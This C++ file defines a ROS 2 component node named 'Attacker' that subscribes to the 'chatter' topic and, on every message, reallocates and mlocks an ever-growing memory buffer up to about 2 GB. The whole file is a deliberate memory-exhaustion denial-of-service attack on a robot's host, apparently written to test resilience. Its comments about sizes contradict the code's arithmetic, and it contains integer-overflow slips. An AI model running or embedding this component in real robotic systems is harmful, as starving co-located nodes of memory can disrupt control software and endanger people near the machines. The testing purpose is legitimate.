#include "composition/attacker_component.hpp"

#include <iostream>
#include <memory>
#include <chrono>   // For std::chrono::seconds


#include "rclcpp/rclcpp.hpp"
#include "std_msgs/msg/string.hpp"
#include <sys/mman.h>

namespace composition
{

// Create a Listener "component" that subclasses the generic rclcpp::Node base class.
// Components get built into shared libraries and as such do not write their own main functions.
// The process using the component's shared library will instantiate the class as a ROS node.
Attacker::Attacker(const rclcpp::NodeOptions & options)
: Node("attacker", options), num_bytes_allocated_(0), kBytesAllocatedPerAttack_(1 << 14) // 16 MB per attack
{
  // Create a callback function for when messages are received.
  // Variations of this function also exist using, for example, UniquePtr for zero-copy transport.
  auto callback =
    [this](std_msgs::msg::String::ConstSharedPtr msg) -> void
    {
        (void) msg;
        steal_mem((1 << 31), (1 << 20)); // start with 16MB
    };

  // Create a subscription to the "chatter" topic which can be matched with one or more
  // compatible ROS publishers.
  // Note that not all publishers on the same topic with the same type will be compatible:
  // they must have compatible Quality of Service policies.
  sub_ = create_subscription<std_msgs::msg::String>("chatter", 10, callback);
}

void Attacker::steal_mem(size_t max_num_bytes_allocated, size_t start_with){
    if(num_bytes_allocated_ == 0){
        num_bytes_allocated_ = start_with;
        RCLCPP_INFO(get_logger(), "Start with %ld.", num_bytes_allocated_);
    }
    if (num_bytes_allocated_ < max_num_bytes_allocated) {
        size_t memory_to_allocate = std::min(num_bytes_allocated_ + (kBytesAllocatedPerAttack_ << 10),
            max_num_bytes_allocated);
        void * new_memory_block = realloc(memory_block_, memory_to_allocate);
        if (new_memory_block == NULL) {
          kBytesAllocatedPerAttack_ -= 100; // if failed try with smaller size 
          RCLCPP_ERROR(get_logger(), "Failed to allocate memory, decreasing bytes per attack: %ld", kBytesAllocatedPerAttack_);
        } else {
          memory_block_ = new_memory_block;
          num_bytes_allocated_ = memory_to_allocate;
          int result = mlock(memory_block_, num_bytes_allocated_);
          RCLCPP_INFO(get_logger(), "Locking memory [%ld] bytes.", num_bytes_allocated_);
          if (0 != result) {
            RCLCPP_ERROR(get_logger(), "Error while trying to lock memory: %s ", std::strerror(errno));
          }
        }
    }
    std::flush(std::cout);
}


}  // namespace composition

#include "rclcpp_components/register_node_macro.hpp"

// Register the component with class_loader.
// This acts as a sort of entry point, allowing the component to be discoverable when its library
// is being loaded into a running process.
RCLCPP_COMPONENTS_REGISTER_NODE(composition::Attacker)
